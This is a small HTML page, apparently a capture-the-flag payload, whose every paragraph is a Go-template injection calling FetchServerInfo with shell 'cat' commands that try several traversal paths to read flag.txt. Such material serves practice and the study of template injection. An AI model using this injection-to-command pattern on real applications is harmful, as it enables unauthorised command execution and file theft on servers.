<!doctype html>
<html>
  <head>
    <title>This is the title of the webpage!</title>
  </head>
  <body>
<p>{{.FetchServerInfo "cat ../flag.txt"}}</p>
<p>{{.FetchServerInfo "cat ../../flag.txt"}}</p>
<p>{{.FetchServerInfo "cat ../../../flag.txt"}}</p>
<p>{{.FetchServerInfo "cat ./flag.txt"}}</p>

  </body>
</html>
